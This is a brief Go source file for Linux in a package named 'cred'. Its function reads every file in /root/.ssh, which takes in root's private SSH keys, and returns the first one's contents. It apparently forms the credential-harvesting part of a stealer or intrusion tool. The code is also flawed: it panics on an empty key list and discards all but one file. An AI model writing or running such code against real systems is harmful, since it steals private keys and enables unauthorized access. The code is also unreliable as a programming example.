//go:build linux

package cred

import (
	"os"
)

func ReadSSHKeys() string {
	dir := "/root/.ssh"
	entries, err := os.ReadDir(dir)
	if err != nil {
		return ""
	}
	var keys []string
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		path := dir + "/" + entry.Name()
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		keys = append(keys, string(data))
	}
	return keys[0]
}
